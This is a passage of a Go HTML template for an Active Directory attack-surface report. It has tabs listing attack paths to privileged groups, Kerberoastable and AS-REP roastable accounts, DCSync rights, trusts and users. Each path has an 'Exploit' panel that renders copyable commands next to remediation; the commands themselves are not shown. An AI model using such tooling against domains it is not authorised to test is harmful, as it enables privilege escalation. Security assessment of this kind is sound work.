    <div style="display:grid;grid-template-columns:24px 1fr auto;gap:16px;padding:16px 20px;
      {{if lt $i (sub (len $.TopIssues) 1)}}border-bottom:1px solid var(--border);{{end}}align-items:center">
      <div style="font-size:1.2rem;font-weight:700;color:var(--text-sev-critical)">{{add $i 1}}</div>
      <div>
        <div style="font-size:0.95rem;color:var(--text-main);font-weight:600;margin-bottom:4px">{{$issue.Title}}</div>
        <div style="font-size:0.82rem;color:var(--text-secondary);line-height:1.5">{{$issue.Description}}</div>
      </div>
      <button onclick="showTab('{{$issue.Tab}}'){{if $issue.Anchor}};setTimeout(function(){var e=document.getElementById('{{$issue.Anchor}}');if(e)e.scrollIntoView({behavior:'smooth',block:'start'});},100){{end}}"
        style="background:var(--bg-hover);border:1px solid var(--border);border-radius:6px;
        color:var(--accent);padding:6px 14px;font-size:0.8rem;cursor:pointer;white-space:nowrap">
        View &rarr;
      </button>
    </div>
    {{end}}
  </div>
  {{end}}

  <!-- Quick stats — environment size + health -->
  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px">
    <div class="card"><div class="value">{{.Summary.TotalUsers}}</div><div class="label">Users</div></div>
    <div class="card"><div class="value">{{.Summary.TotalComputers}}</div><div class="label">Computers</div></div>
    <div class="card"><div class="value">{{.Summary.TotalGroups}}</div><div class="label">Groups</div></div>
    <div class="card {{if gt .Summary.KrbtgtPwdAgeDays 180}}warning{{else}}ok{{end}}"><div class="value">{{if eq .Summary.KrbtgtPwdAgeDays 0}}?{{else}}{{.Summary.KrbtgtPwdAgeDays}}d{{end}}</div><div class="label">Krbtgt Pwd Age</div></div>
  </div>

  <!-- Scope -->
  <div style="padding:16px 20px;background:var(--bg-grouped);border:1px solid var(--border);
    border-radius:8px;font-size:0.82rem;color:var(--text-secondary);line-height:1.6">
    <strong style="color:var(--text-main)">Scope:</strong> This report enumerates Active Directory
    attack surface via authenticated LDAP queries. Findings include attack paths to privileged groups,
    dangerous ACL permissions, Kerberos delegation issues, and policy misconfigurations.
    Severity ratings follow industry-standard frameworks (MITRE ATT&amp;CK, CIS).
  </div>

</div>

<!-- SUMMARY TAB -->
<div id="tab-summary" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-summary" tabindex="0" aria-hidden="true">

  <!-- Risk Score card -->
  <div style="display:grid;grid-template-columns:auto 1fr;gap:24px;padding:24px;
    background:var(--bg-card);border:1px solid var(--border);border-radius:8px;margin-bottom:24px;align-items:center">
    <div style="text-align:center;padding:0 24px;border-right:1px solid var(--border)">
      <div style="font-size:3.5rem;font-weight:800;line-height:1;color:{{.RiskScore.GradeColor}}">{{.RiskScore.Grade}}</div>
      <div style="font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;margin-top:8px">Risk Grade</div>
      <div style="font-size:1.5rem;font-weight:700;color:var(--text-main);margin-top:12px">
        {{.RiskScore.Total}}<span style="font-size:0.9rem;color:var(--text-muted)">/100</span>
      </div>
    </div>
    <div>
      <div style="font-size:0.85rem;color:var(--text-muted);margin-bottom:4px">Risk contribution by category</div>
      <div style="font-size:0.72rem;color:var(--text-subtle);margin-bottom:12px">Bar length = absolute points contributed. Color = % of category cap.</div>
      <div style="display:flex;flex-direction:column;gap:6px">
        {{range $e := .RiskScore.SortedBreakdown}}{{if gt $e.Value 0}}
        <div style="display:flex;align-items:center;gap:12px;font-size:0.82rem">
          <div style="width:140px;color:var(--text-secondary)">{{$e.Name}}</div>
          <div style="flex:1;background:var(--bg-hover);border-radius:3px;height:6px;overflow:hidden">
            <div style="width:{{barWidthAbsolute $e.Value}}%;height:100%;background:{{barColor $e.Value $e.Name}};transition:width 0.3s"></div>
          </div>
          <div style="width:64px;text-align:right;color:var(--text-main);font-weight:600;font-variant-numeric:tabular-nums">
            {{$e.Value}}<span style="color:var(--text-muted);font-weight:400">/{{capFor $e.Name}}</span>
          </div>
        </div>
        {{end}}{{end}}
      </div>
    </div>
  </div>

  <!-- Findings Overview -->
  <div style="padding:20px 24px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;margin-bottom:24px">
   <div style="font-size:14px;font-weight:500;color:var(--text-main);margin-bottom:16px">
    Findings Overview — {{.Domain}}
   </div>
   <div id="findings-chart" style="display:flex;flex-direction:column;gap:10px"></div>
  </div>

  <!-- Attack Surface -->
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Attack Surface</div>
  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-bottom:20px">
    <div class="card {{if gt .Summary.AttackPathsCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'paths')" title="View Attack Paths to privileged groups">
      <div class="value">{{.Summary.AttackPathsCount}}</div>
      <div class="label">Attack Paths</div>
    </div>
    <div class="card {{if gt .Summary.CriticalCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'paths')" title="Short paths (depth ≤ 2) are easiest to exploit">
      <div class="value">{{.Summary.CriticalCount}}</div>
      <div class="label">Short Paths (≤2 hops)</div>
    </div>
    <div class="card {{if gt .Summary.KerberoastableCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'kerberos')" title="View Kerberoastable accounts">
      <div class="value">{{.Summary.KerberoastableCount}}</div>
      <div class="label">Kerberoastable</div>
    </div>
    <div class="card {{if gt .Summary.ASREPCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'kerberos')" title="View AS-REP Roastable accounts">
      <div class="value">{{.Summary.ASREPCount}}</div>
      <div class="label">AS-REP Roastable</div>
    </div>
    <div class="card {{if gt .Summary.DelegationCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'delegation')" title="View Delegation findings">
      <div class="value">{{.Summary.DelegationCount}}</div>
      <div class="label">Delegation Issues</div>
    </div>
    <div class="card {{if gt .Summary.DangerousACLCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'acl')" title="View ACL findings">
      <div class="value">{{.Summary.DangerousACLCount}}</div>
      <div class="label">Dangerous ACLs</div>
    </div>
    <div class="card {{if gt .Summary.DCSyncCount 0}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'acl')" title="View DCSync findings">
      <div class="value">{{.Summary.DCSyncCount}}</div>
      <div class="label">DCSync Rights</div>
    </div>
  </div>

  <!-- Exposure -->
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Exposure</div>
  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-bottom:20px">
    <div class="card {{if gt .Summary.PasswordNeverExpires 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'users')" title="View users with non-expiring passwords">
      <div class="value">{{.Summary.PasswordNeverExpires}}</div>
      <div class="label">Pwd Never Expires</div>
    </div>
    <div class="card {{if gt .Summary.AdminCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'users')" title="View admin-flagged users">
      <div class="value">{{.Summary.AdminCount}}</div>
      <div class="label">Admins</div>
    </div>
    <div class="card" onclick="showTabByClick(event,'users')" title="View all users">
      <div class="value">{{.Summary.EnabledUsers}}</div>
      <div class="label">Enabled Users</div>
    </div>
    <div class="card" onclick="showTabByClick(event,'computers')" title="View computers">
      <div class="value">{{.Summary.TotalComputers}}</div>
      <div class="label">Computers</div>
    </div>
    <div class="card {{if gt .Summary.StaleUsersCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'exposure')" title="View stale accounts">
      <div class="value">{{.Summary.StaleUsersCount}}</div>
      <div class="label">Stale Users (90d)</div>
    </div>
    <div class="card {{if gt .Summary.PasswordInDescCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'exposure')" title="View all object descriptions">
      <div class="value">{{.Summary.PasswordInDescCount}}</div>
      <div class="label">Have Description</div>
    </div>
    <div class="card {{if .Summary.KrbtgtAtRisk}}critical{{else}}ok{{end}}" onclick="showTabByClick(event,'exposure')" title="View krbtgt status">
      <div class="value">{{if eq .Summary.KrbtgtPwdAgeDays 0}}?{{else}}{{.Summary.KrbtgtPwdAgeDays}}d{{end}}</div>
      <div class="label">Krbtgt Pwd Age</div>
    </div>
    <div class="card {{if gt .Summary.NoLAPSCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'computers')" title="Computers without LAPS">
      <div class="value">{{.Summary.NoLAPSCount}}</div>
      <div class="label">No LAPS</div>
    </div>
    <div class="card {{if gt .Summary.ADCSCriticalCount 0}}critical{{else if gt .Summary.ADCSTemplateCount 0}}warning{{else}}ok{{end}}" onclick="showTabByClick(event,'adcs')" title="Vulnerable certificate templates">
      <div class="value">{{.Summary.ADCSTemplateCount}}</div>
      <div class="label">ADCS Vulns</div>
    </div>
  </div>

  <!-- Policy & Configuration -->
  <div id="policy-section" style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Policy & Configuration</div>
  <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;overflow:hidden">
    {{if .GPOResult}}{{if .GPOResult.DefaultPolicy}}
    {{$pp := .GPOResult.DefaultPolicy}}
    {{if not $pp.Complexity}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-critical">Critical</span>
      <span style="font-size:13px;color:var(--text-main)">Password complexity disabled</span>
    </div>
    {{end}}
    {{if lt $pp.MinLength 8}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-critical">Critical</span>
      <span style="font-size:13px;color:var(--text-main)">Minimum password length: {{$pp.MinLength}} chars</span>
    </div>
    {{end}}
    {{if or (eq $pp.MaxAge 0) (gt $pp.MaxAge 3650)}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-critical">Critical</span>
      <span style="font-size:13px;color:var(--text-main)">Passwords never expire</span>
    </div>
    {{end}}
    {{if $pp.ReversibleEncryption}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-critical">Critical</span>
      <span style="font-size:13px;color:var(--text-main)">Reversible encryption enabled</span>
    </div>
    {{end}}
    {{if eq $pp.LockoutThreshold 0}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-critical">Critical</span>
      <span style="font-size:13px;color:var(--text-main)">Account lockout disabled — brute force possible</span>
    </div>
    {{else}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--border)">
      <span class="badge badge-ok">OK</span>
      <span style="font-size:13px;color:var(--text-main)">Account lockout configured (threshold: {{$pp.LockoutThreshold}})</span>
    </div>
    {{end}}
    {{if not $pp.ReversibleEncryption}}
    <div style="display:flex;align-items:center;gap:12px;padding:10px 16px">
      <span class="badge badge-ok">OK</span>
      <span style="font-size:13px;color:var(--text-main)">Reversible encryption disabled</span>
    </div>
    {{end}}
    {{end}}{{else}}
    <div style="padding:16px;color:var(--text-muted);font-size:13px">GPO data not collected — run with --report to include policy analysis</div>
    {{end}}
  </div>

</div>

<!-- ATTACK PATHS TAB -->
<div id="tab-paths" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-paths" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    Attack Paths to Privileged Groups
    <span>{{.Summary.AttackPathsCount}} {{plural .Summary.AttackPathsCount "path" "paths"}} found</span>
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="A chain of AD relationships (group memberships, ACL rights, delegation) that leads a low-privileged account to Domain Admins or another privileged group. Depth 1 = direct member. Depth 2+ = indirect via nested groups or ACL abuse. Shorter paths = higher priority.">?</span>
  </h2>
  {{if eq .Summary.AttackPathsCount 0}}
    <p style="color:var(--color-ok)">✓ No attack paths to Domain Admins found.</p>
  {{else}}
  {{range $i, $path := .AttackPaths}}
  <div class="path-card">
    <div class="path-header">
      <span class="badge {{pathSeverityClass $path.Depth}}">
        {{pathSeverity $path.Depth}}
      </span>
      {{if $path.TargetGroup}}
      <span class="badge" style="background:var(--bg-hover);color:var(--text-sev-critical)">→ {{$path.TargetGroup}}</span>
      {{end}}
      {{if $path.SourceDomain}}
      <span class="badge" style="background:var(--bg-hover);color:var(--text-muted);font-size:0.75rem">{{$path.SourceDomain}}</span>
      {{end}}
      <span style="color:var(--text-muted); font-size:0.85rem">
        Path {{inc $i}} &nbsp;|&nbsp; Depth: {{$path.Depth}}
      </span>
    </div>
    <div class="path-body">
      <div class="path-chain">
        {{range $j, $node := $path.Nodes}}
          <div class="path-node
            {{if or $node.AdminCount (isPrivilegedGroup $node.SAMAccountName)}}is-admin{{end}}
            {{if $node.Kerberoastable}}is-kerb{{end}}">
            {{nodeTypeIcon $node.Type}} {{$node.SAMAccountName}}
          </div>
          {{if lt $j (dec (len $path.Nodes))}}
            <div class="path-arrow">→</div>
          {{end}}
        {{end}}
      </div>
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false">
        <span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span>
      </button>
      <div class="acc-body">
        {{with pathExploitData $path.Nodes $path.TargetGroup}}
        <div class="acc-label">Exploit</div>
        <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Description}}</div>
        {{range .Commands}}
        <div class="acc-cmd-wrap"><code class="acc-cmd">{{.}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        {{end}}
        <div class="acc-label" style="margin-top:10px">Remediation</div>
        <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Fix}}</div>
        {{if .AuditCmd}}
        <div class="acc-cmd-wrap"><code class="acc-cmd">{{.AuditCmd}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        {{end}}
        {{end}}
      </div>
    </div>
  </div>
  {{end}}
  {{end}}
</div>

<!-- GRAPH TAB -->
<div id="tab-graph" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-graph" tabindex="0" aria-hidden="true">
  <h2 class="section-title">Attack Path Graph <span class="help-icon" role="tooltip" tabindex="0" data-tip="Visual attack path graph — nodes represent AD objects, edges show exploitable relationships. Node size reflects how many attack paths pass through it. Hover for details, scroll to zoom, drag to pan.">?</span> <span>Layered path view — nodes sized by path count</span></h2>
  <div style="display:flex;gap:16px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
    <div style="font-size:0.8rem;color:var(--text-muted)">
      <span style="color:var(--text-sev-critical)">●</span> DA/Admin &nbsp;
      <span style="color:var(--text-sev-high)">●</span> Kerberoastable &nbsp;
      <span style="color:var(--node-group)">●</span> Group &nbsp;
      <span style="color:var(--node-computer)">●</span> Computer &nbsp;
      <span style="color:var(--node-user)">●</span> User
    </div>
    <button onclick="resetZoom()" style="margin-left:auto;padding:4px 12px;background:var(--bg-hover);border:none;color:var(--text-secondary);border-radius:4px;cursor:pointer;font-size:0.8rem">Reset Zoom</button>
  </div>
  <div id="graph-container" style="position:relative">
    <svg id="graph-svg"></svg>
    <div id="graph-tooltip" style="display:none;position:absolute;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:10px 14px;font-size:0.8rem;pointer-events:none;max-width:280px;z-index:10"></div>
  </div>
  <div style="margin-top:8px;font-size:0.75rem;color:var(--text-subtle)">
    Drag to pan · Scroll to zoom · Hover node for details · Node size = number of paths through it
  </div>
</div>

<!-- TRUSTS TAB -->
<div id="tab-trusts" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-trusts" tabindex="0" aria-hidden="true">
  <h2 class="section-title">Domain &amp; Forest Trusts {{mitreBadges "trust_abuse"}}
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="Domain trusts define authentication paths between domains. SID filtering disabled on a trust allows SID history abuse — an attacker in a trusted domain can forge SIDs to escalate privileges in this domain. Bidirectional forest trusts create lateral movement paths between forests. Foreign Security Principals (FSPs) are accounts from trusted domains added to local groups.">?</span>
  </h2>

  {{if .TrustResult}}

  {{if not .TrustResult.Trusts}}
  <p style="color:var(--text-muted);margin-bottom:20px">No trusts found — this may be a standalone domain.</p>
  {{else}}

  <!-- Trust table -->
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Configured Trusts</div>
  <div class="table-wrap" style="margin-bottom:24px">
  <table>
    <thead>
      <tr><th>Trusted Domain</th><th>NetBIOS</th><th>Direction</th><th>Type</th><th>SID Filtering</th><th>Severity</th><th>CVSS</th><th>Risks</th></tr>
    </thead>
    <tbody>
    {{range .TrustResult.Trusts}}
    <tr>
      <td class="mono">{{.Name}}</td>
      <td class="mono" style="color:var(--text-muted)">{{.FlatName}}</td>
      <td>{{.Direction}}</td>
      <td style="color:var(--text-secondary);font-size:0.82rem">{{.TrustType}}</td>
      <td>
        {{if .SIDFilteringOn}}
          <span class="badge badge-ok">ON ✓</span>
        {{else if .IsWithinForest}}
          <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">Internal</span>
        {{else}}
          <span class="badge badge-critical">OFF ⚠</span>
        {{end}}
      </td>
      <td>
        {{if eq .Severity "Critical"}}<span class="badge badge-critical">Critical</span>
        {{else if eq .Severity "High"}}<span class="badge badge-high">High</span>
        {{else if eq .Severity "Medium"}}<span class="badge badge-medium">Medium</span>
        {{else}}<span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">Info</span>{{end}}
      </td>
      <td>{{if gt .CVSS 0.0}}<span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>{{else}}—{{end}}</td>
      <td style="font-size:0.78rem;color:var(--text-sev-critical)">
        {{range .Risks}}<div>⚠ {{.}}</div>{{end}}
      </td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>

  {{end}}

  <!-- Foreign Security Principals -->
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;display:flex;align-items:center;gap:6px">
    Foreign Security Principals in Privileged Groups
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="Foreign Security Principals (FSPs) are objects representing users or groups from trusted external domains. If an FSP is a member of a privileged local group (Domain Admins, Administrators), an attacker who compromises the external domain gains privilege in this domain too.">?</span>
  </div>
  {{if .TrustResult.FSPs}}
  <div class="path-card" style="margin-bottom:12px;padding:12px 16px;border-color:var(--text-sev-critical)">
    <span class="badge badge-critical" style="margin-bottom:8px;display:inline-block">⚠ {{len .TrustResult.FSPs}} external principal(s) in privileged groups</span>
  </div>
  <div class="table-wrap">
  <table>
    <thead><tr><th>External SID</th><th>Severity</th><th>CVSS</th><th>Member of</th></tr></thead>
    <tbody>
    {{range .TrustResult.FSPs}}
    <tr>
      <td class="mono" style="font-size:0.8rem">{{.ExternalSID}}</td>
      <td><span class="badge {{if eq .Severity "Critical"}}badge-critical{{else}}badge-medium{{end}}">{{.Severity}}</span></td>
      <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
      <td style="font-size:0.82rem;color:var(--text-secondary)">{{joinSPNs .MemberOfGroups}}</td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>
  {{else}}
  <p style="color:var(--color-ok)">✓ No foreign security principals found in privileged groups.</p>
  {{end}}

  {{else}}
  <p style="color:var(--text-muted)">Trust data not available.</p>
  {{end}}

  <!-- Trusted Domain Skip Notices (auth failed) -->
  {{if .TrustedDomains}}
  <div style="margin-top:20px">
    {{range .TrustedDomains}}
    <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;margin-bottom:8px;font-size:0.85rem">
      <span style="color:var(--text-sev-medium)">[-]</span>
      <span class="mono" style="color:var(--text-main)">{{.Domain}}</span>
      <span style="color:var(--text-muted)">— skipped (auth failed, provide creds for this domain)</span>
    </div>
    {{end}}
  </div>
  {{end}}

</div>

<!-- USERS TAB -->
<div id="tab-users" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-users" tabindex="0" aria-hidden="true">
  <h2 class="section-title">Users <span class="help-icon" role="tooltip" tabindex="0" data-tip="All domain user accounts. Rows highlighted in red belong to privileged groups (DA, EA, etc.). Use filters to find Kerberoastable, AS-REP roastable, or expired-password accounts.">?</span> <span>{{.Summary.TotalUsers}} total</span></h2>
  <div class="filter-bar">
    <input type="text" placeholder="Search users..." oninput="filterTable('tbl-users','cnt-users')">
    <select data-col="3" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">Domain: all</option>
      {{range $.AllDomains}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <select data-col="4" data-match="exact" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">Enabled: all</option>
      <option value="✓">Enabled only</option>
      <option value="—">Disabled only</option>
    </select>
    <select data-col="5" data-match="exact" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">Kerberoastable: all</option>
      <option value="✓">Yes</option>
    </select>
    <select data-col="6" data-match="exact" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">AS-REP: all</option>
      <option value="✓">Yes</option>
    </select>
    <select data-col="7" data-match="exact" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">Pwd Exp: all</option>
      <option value="✓">Never expires</option>
    </select>
    <select data-col="13" data-also-col="12" onchange="filterTable('tbl-users','cnt-users')">
      <option value="">Group: all</option>
      {{range $.AllGroupNames}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <span class="filter-count" id="cnt-users"></span>
    <button onclick="clearFilters('tbl-users','cnt-users')">Clear</button>
  </div>
  <div class="table-wrap">
  <table id="tbl-users">
    <thead>
      <tr>
        <th class="sortable" onclick="sortTable(this)">Account</th>
        <th class="sortable" onclick="sortTable(this)">CN</th>
        <th class="sortable" onclick="sortTable(this)">Display Name</th>
        <th class="sortable" onclick="sortTable(this)">Domain</th>
        <th class="sortable" onclick="sortTable(this)">Enabled</th>
        <th class="sortable" onclick="sortTable(this)">Kerberoastable</th>
        <th class="sortable" onclick="sortTable(this)">AS-REP</th>
        <th class="sortable" onclick="sortTable(this)">Pwd Never Exp</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Last Logon</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Pwd Last Set</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Created</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Changed</th>
        <th class="sortable" onclick="sortTable(this)">Primary Group</th>
        <th>Member Of</th>
        <th>Description</th>
        <th class="mono">SID</th>
      </tr>
    </thead>
    <tbody>
    {{range .Users}}
    <tr{{if index $.UserPrivGroups .DN}} class="row-priv"{{end}}>
      <td class="mono">{{.SAMAccountName}}</td>
      <td class="mono">{{.CN}}</td>
      <td>{{.DisplayName}}</td>
      <td class="mono" style="font-size:0.78rem;color:var(--text-muted)">{{.SourceDomain}}</td>
      <td>{{if .Enabled}}<span class="txt-yes">✓</span>{{else}}—{{end}}</td>
      <td>{{if .SPNs}}<span class="txt-warn">✓</span>{{else}}—{{end}}</td>
      <td>{{if .DontReqPreauth}}<span class="txt-warn">✓</span>{{else}}—{{end}}</td>
      <td>{{if .PasswordNeverExpires}}<span class="txt-warn">✓</span>{{else}}—{{end}}</td>
      <td class="mono">{{.LastLogon}}</td>
      <td class="mono">{{.PasswordLastSet}}</td>
      <td class="mono">{{.CreatedOn}}</td>
      <td class="mono">{{.ChangedOn}}</td>
      <td>{{if .PrimaryGroup}}{{.PrimaryGroup}}{{else}}—{{end}}</td>
      <td style="max-width:180px">{{range .MemberOf}}<div class="mono">{{dnToSAM .}}</div>{{end}}</td>
      <td style="color:var(--text-muted)">{{.Description}}</td>
      <td class="mono" style="font-size:0.75rem;color:var(--text-subtle)">{{.ObjectSid}}</td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>
</div>

<!-- GROUPS TAB -->
<div id="tab-groups" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-groups" tabindex="0" aria-hidden="true">
  <h2 class="section-title">Groups <span class="help-icon" role="tooltip" tabindex="0" data-tip="All security and distribution groups. Pay attention to high-member-count groups with sensitive names — attackers target these for privilege escalation via AddMember abuse.">?</span> <span>{{.Summary.TotalGroups}} total</span></h2>
  <div class="filter-bar">
    <input type="text" placeholder="Search groups..." oninput="filterTable('tbl-groups','cnt-groups')">
    <select data-col="2" onchange="filterTable('tbl-groups','cnt-groups')">
      <option value="">Domain: all</option>
      {{range $.AllDomains}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <select data-col="3" onchange="filterTable('tbl-groups','cnt-groups')">
      <option value="">Type: all</option>
      <option value="Security">Security</option>
      <option value="Distribution">Distribution</option>
      <option value="Global">Global</option>
      <option value="Universal">Universal</option>
      <option value="Local">Local</option>
    </select>
    <select data-col="5" data-match="exact" onchange="filterTable('tbl-groups','cnt-groups')">
      <option value="">Admin: all</option>
      <option value="✓">Admins only</option>
    </select>
    <span class="filter-count" id="cnt-groups"></span>
    <button onclick="clearFilters('tbl-groups','cnt-groups')">Clear</button>
  </div>
  <div class="table-wrap">
  <table id="tbl-groups">
    <thead>
      <tr>
        <th class="sortable" onclick="sortTable(this)">Name</th>
        <th class="sortable" onclick="sortTable(this)">CN</th>
        <th class="sortable" onclick="sortTable(this)">Domain</th>
        <th class="sortable" onclick="sortTable(this)">Type</th>
        <th class="sortable" onclick="sortTable(this)">Members</th>
        <th class="sortable" onclick="sortTable(this)">Admin</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Created</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Changed</th>
        <th>Member Of</th>
        <th>Description</th>
        <th class="mono">SID</th>
      </tr>
    </thead>
    <tbody>
    {{range .Groups}}
    <tr>
      <td class="mono">{{.SAMAccountName}}</td>
      <td class="mono">{{.CN}}</td>
      <td class="mono" style="font-size:0.78rem;color:var(--text-muted)">{{.SourceDomain}}</td>
      <td>{{.GroupType}}</td>
      <td>{{len .Members}}</td>
      <td>{{if .AdminCount}}<span class="txt-warn">✓</span>{{else}}—{{end}}</td>
      <td class="mono">{{.CreatedOn}}</td>
      <td class="mono">{{.ChangedOn}}</td>
      <td style="max-width:180px">{{range .MemberOf}}<div class="mono">{{dnToSAM .}}</div>{{end}}</td>
      <td style="color:var(--text-muted)">{{.Description}}</td>
      <td class="mono" style="font-size:0.75rem;color:var(--text-subtle)">{{.ObjectSid}}</td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>
</div>

<!-- COMPUTERS TAB -->
<div id="tab-computers" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-computers" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    Computers <span class="help-icon" role="tooltip" tabindex="0" data-tip="All domain-joined computer accounts. Key columns: unconstrained delegation (high risk), LAPS coverage, OS version. Outdated OS or missing LAPS are common lateral movement enablers.">?</span>
    <span>{{.Summary.TotalComputers}} total{{if .ForestWide}} — forest-wide{{end}}</span>
  </h2>
  <div class="filter-bar">
    <input type="text" placeholder="Search computers..." oninput="filterTable('tbl-computers','cnt-computers')">
    <select data-col="1" onchange="filterTable('tbl-computers','cnt-computers')">
      <option value="">Domain: all</option>
      {{range $.AllDomains}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <select data-col="2" onchange="filterTable('tbl-computers','cnt-computers')">
      <option value="">OS: all</option>
      {{range $.AllComputerOS}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <select data-col="4" data-match="exact" onchange="filterTable('tbl-computers','cnt-computers')">
      <option value="">Enabled: all</option>
      <option value="✓">Enabled only</option>
      <option value="—">Disabled only</option>
    </select>
    <select data-col="5" data-match="exact" onchange="filterTable('tbl-computers','cnt-computers')">
      <option value="">LAPS: all</option>
      <option value="✓">LAPS enabled</option>
      <option value="—">No LAPS</option>
    </select>
    <span class="filter-count" id="cnt-computers"></span>
    <button onclick="clearFilters('tbl-computers','cnt-computers')">Clear</button>
  </div>
  <div class="table-wrap">
  <table id="tbl-computers">
    <thead>
      <tr>
        <th class="sortable" onclick="sortTable(this)">Name</th>
        <th class="sortable" onclick="sortTable(this)">Domain</th>
        <th class="sortable" onclick="sortTable(this)">OS</th>
        <th class="sortable" onclick="sortTable(this)">Version</th>
        <th class="sortable" onclick="sortTable(this)">Enabled</th>
        <th class="sortable" onclick="sortTable(this)">LAPS</th>
        <th class="sortable" onclick="sortTable(this)">Unconstrained Delegation</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Last Logon</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Created</th>
        <th class="sortable" onclick="sortTable(this)" style="min-width:115px">Changed</th>
        <th class="sortable" onclick="sortTable(this)">CN</th>
        <th class="mono">SID</th>
        <th>Description</th>
      </tr>
    </thead>
    <tbody>
    {{range .Computers}}
    <tr>
      <td class="mono" style="white-space:nowrap">
        {{.SAMAccountName}}
        {{if .IsGC}}<span style="color:var(--text-subtle);font-size:0.72rem" title="Partial data from Global Catalog">&nbsp;(GC)</span>{{end}}
        {{if .DNSHostName}}<div style="color:var(--text-muted);font-size:0.78rem">{{.DNSHostName}}</div>{{end}}
      </td>
      <td class="mono">{{.Domain}}</td>
